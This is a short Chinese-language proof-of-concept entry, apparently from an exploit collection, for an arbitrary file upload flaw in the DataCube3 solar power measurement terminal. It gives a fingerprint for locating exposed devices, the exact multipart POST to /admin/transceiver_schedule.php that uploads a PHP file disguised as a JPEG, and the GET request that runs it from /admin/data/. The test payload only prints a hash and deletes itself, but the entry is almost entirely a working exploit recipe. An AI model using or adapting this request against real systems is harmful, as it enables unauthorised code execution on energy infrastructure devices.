# Japan太阳能系统DataCube3终端测量系统存在任意文件上传漏洞

- **系统**：Japan　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title=="DataCube3"`
- **请求**：`POST /admin/transceiver_schedule.php?usb_schedule HTTP/1.1`
- **关键头**：`Content-Length: 259`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2okM2XNc…`

**请求体 / payload**
```
------WebKitFormBoundary2okM2XNcEINQCOiN4jrZ5I3gQVG
Content-Disposition: form-data; name="upload_file"; filename="gxt7mb.php"
Content-Type: image/jpeg
<?php print_r(md5(123456));unlink(__FILE__);?>
------WebKitFormBoundary2okM2XNcEINQCOiN4jrZ5I3gQVG--
上传定位：
GET /admin/data/gxt7mb.php HTTP/1.1
Host:
Cookie: SESS_IDS=h1rhepo9m5rd82hsfnhdruhrvo
```
- **预期**：200　|　—